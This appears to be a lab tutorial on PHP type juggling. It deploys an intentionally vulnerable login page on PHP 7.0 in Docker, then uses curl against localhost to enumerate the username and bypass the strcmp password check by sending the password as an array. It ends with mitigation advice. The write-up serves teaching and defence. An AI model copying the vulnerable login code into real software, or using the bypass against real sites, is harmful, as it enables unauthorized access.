# PHP Type Juggling example

## Preparing the environment

We need to have an apache server to deploy our example app, so I did this by using a docker
container. The following structure was used:

<pre>
/php
  |
  |-- /test
  |      |
  |      |-- test.php
  |-- Dockerfile
</pre>

* First of all we need to create the vulnerable `test.php`.

```php
<html>
    <body>
        <h1>Login page</h1>
        <form method="POST" action="test.php">
            Username: <input type="text" name="username" id="username"/><br/>    
            Password: <input type="password" name="password" id="password"/><br/>
            <input type="submit"/>
        </form>
    </body>
</html>

<?php
    $USERNAME = "admin";
    $PASSWORD = "m0sts3cVr3P4ssw0rdY0vh4v3s33m";

    if (isset($_POST["username"]) && isset($_POST["password"])) {
        if ($_POST["username"] == $USERNAME) {
            if (strcmp($_POST["password"], $PASSWORD) == 0) {
                echo "Secret number is 543456761";
            }
            else {
                echo "Wrong password";
            }
        } else {
            echo "Wrong username";
        }
    }
?>
```

* Create the following `Dockerfile` to deploy the code:

```Dockerfile
FROM php:7.0-apache
COPY test /var/www/html
EXPOSE 80
```

* In order to easily deploy the code I've created a simple bash script:

```bash
#!/bin/bash

clear
echo "[*] Building image"
docker build -t php php/. > /dev/null 2> /dev/null
echo "[*] Starting docker container"
docker stop php-app > /dev/null 2> /dev/null
docker rm php-app > /dev/null 2> /dev/null
docker run -d --name php-app -p 80:80 php > /dev/null 2> /dev/null
```

With this setup you can access the deployed app in http://localhost/test.php.

## About the vulnerability

This vulnerability deals with PHP "magic" conversion between types of
variables when we're using loose comparison ```==``` and ```!=```, instead of strict comparison ```===``` and ```!==```. If we try to compare two
different types, then PHP tries to convert them to the same type to be
able to make the comparison. This is dangerous and it can be exploited as
you can see here in more detail:
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Type%20Juggling. It is important to notice that this is not possible 
anymore in PHP 8 (you can do the tests by increasing the PHP version in
the Dockerfile). 

## How to exploit it 

What are we going to test here? Well, the code is using
the method `strcmp()` to check for password validity.

```php
if (strcmp($_POST["password"], $PASSWORD) == 0) {
    echo "Secret number is 543456761";
}
```

Why is this unsafe? Well, this check is valid when we're sure the user
input is a string. But what happens if the user manages to enter an array
type instead? Well, we can check this by running this simple line of code
with php:

```bash
php -r 'var_dump(strcmp([], "test") == 0);'
```

What do we get here? `bool(true)`, which means that we can skip the 
password validation.

Lets exploit the vulnerability! First of all lets build a curl command
to send the form.

```
curl -s -X POST http://localhost/test.php --data "username=test&password=test" | grep -v "<"
```

This command will give as the response without showing the html tags.
What we see in first place is the message `Wrong username`, because
test user is not valid.

We could take benefit of this message to enumerate users and we would
know that `admin` is a valid username. Lets try to send `admin` as
username.

```
curl -s -X POST http://localhost/test.php --data "username=admin&password=test" | grep -v "<"
```

The new message is `Wrong password`, so we already know we have a valid
user. Time to check for Type Juggling. What we need to do is basically
convert the password parameter to be an array. We can do so with the next
line:

```
curl -s -X POST http://localhost/test.php --data "username=admin&password[]=test" | grep -v "<"
```

What happens here is that PHP will perform the following check:

```bash
php -r 'var_dump(strcmp([], $PASSWORD) == 0);'
```

And we already know this is going to be true so we just check we get the
secret message `Secret number is 543456761`.

## Conclusion

Quite an easy vulnerability to exploit and, at least for me, it was quite
surprising to know PHP was doing this unsafe conversions between variable
types until a quite recent version as it is PHP 7.0. I have to read more
about this vulnerability but it seems that the only safe way of correcting
this in old PHP versions is:

* Prefer strict checks over loose checks.
* In case of loose checks then don't trust in users input and sanitize.
* Also avoid strcmp and, if not possible then check users input and
sanitize.